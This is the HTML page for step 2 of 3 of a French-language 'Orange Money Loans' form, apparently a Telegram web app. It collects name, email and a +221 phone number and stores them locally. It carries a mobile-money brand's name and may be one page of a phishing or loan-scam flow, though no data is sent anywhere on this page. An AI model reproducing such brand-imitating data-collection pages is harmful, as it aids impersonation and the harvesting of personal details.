<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Orange Money Loans - Étape 2</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --orange-primary: #f25c05;
            --bg-color: #f7f3ed;
            --card-bg: #ffffff;
            --input-bg: #fdfaf6;
            --border-color: #ffd8b3;
            --text-dark: #222222;
        }
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
        
        .header-box { width: 100%; background: var(--orange-primary); padding: 18px 20px; color: white; text-align: center; font-size: 22px; font-weight: 800; box-sizing: border-box; }
        
        .card { background: var(--card-bg); width: 92%; max-width: 440px; margin: 24px 0; padding: 28px 20px; border-radius: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.03); display: flex; flex-direction: column; }

        .progress-bar-container { display: flex; justify-content: center; gap: 8px; margin-bottom: 18px; }
        .step-pill { height: 4px; flex: 1; border-radius: 2px; background-color: var(--orange-primary); }
        .step-pill.inactive { background-color: #ffe8d6; }

        .step-title { text-align: center; font-size: 20px; font-weight: 800; color: var(--text-dark); margin-bottom: 24px; }

        .form-group { margin-bottom: 20px; display: flex; flex-direction: column; }
        label { font-size: 14px; font-weight: 700; color: var(--text-dark); margin-bottom: 8px; }

        .form-control {
            background-color: var(--input-bg);
            border: 1.5px solid var(--border-color);
            border-radius: 12px;
            padding: 14px 16px;
            font-size: 16px;
            color: var(--text-dark);
            outline: none;
            width: 100%;
            box-sizing: border-box;
        }

        .phone-input-group {
            display: flex;
            background-color: var(--input-bg);
            border: 1.5px solid var(--border-color);
            border-radius: 12px;
            overflow: hidden;
        }

        .phone-prefix {
            background-color: var(--orange-primary);
            color: white;
            padding: 14px 18px;
            font-weight: 800;
            font-size: 16px;
            display: flex;
            align-items: center;
        }

        .phone-input-group input {
            border: none;
            background: transparent;
            padding: 14px 16px;
            font-size: 16px;
            width: 100%;
            outline: none;
        }

        .btn-outline {
            background-color: transparent;
            color: var(--text-dark);
            border: 1.5px solid var(--border-color);
            width: 100%;
            padding: 16px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 800;
            cursor: pointer;
            text-transform: uppercase;
            margin-bottom: 12px;
        }

        .btn-orange {
            background-color: var(--orange-primary);
            color: white;
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 800;
            cursor: pointer;
            text-transform: uppercase;
        }
    </style>
</head>
<body>

<div class="header-box">Orange Money Loans</div>

<div class="card">
    <div class="progress-bar-container">
        <div class="step-pill"></div>
        <div class="step-pill"></div>
        <div class="step-pill inactive"></div>
    </div>

    <div class="step-title">Étape 2 sur 3</div>

    <form onsubmit="goNext(event)">
        <div class="form-group">
            <label>Prénom</label>
            <input type="text" id="firstName" class="form-control" placeholder="Jean" required>
        </div>

        <div class="form-group">
            <label>Nom</label>
            <input type="text" id="lastName" class="form-control" placeholder="Dupont" required>
        </div>

        <div class="form-group">
            <label>Email</label>
            <input type="email" id="email" class="form-control" placeholder="jean@exemple.com" required>
        </div>

        <div class="form-group">
            <label>Téléphone</label>
            <div class="phone-input-group">
                <div class="phone-prefix">+221</div>
                <input type="tel" id="phone" placeholder="XXXXXXXXX" required>
            </div>
        </div>

        <button type="button" class="btn-outline" onclick="history.back()">PRÉCÉDENT</button>
        <button type="submit" class="btn-orange">ÉTAPE SUIVANTE</button>
    </form>
</div>

<script>
    function goNext(e) {
        e.preventDefault();
        const phone = document.getElementById('phone').value.trim();
        localStorage.setItem('firstName', document.getElementById('firstName').value.trim());
        localStorage.setItem('lastName', document.getElementById('lastName').value.trim());
        localStorage.setItem('email', document.getElementById('email').value.trim());
        localStorage.setItem('phone', phone);
        window.location.href = "page4.html";
    }
</script>
</body>
</html>
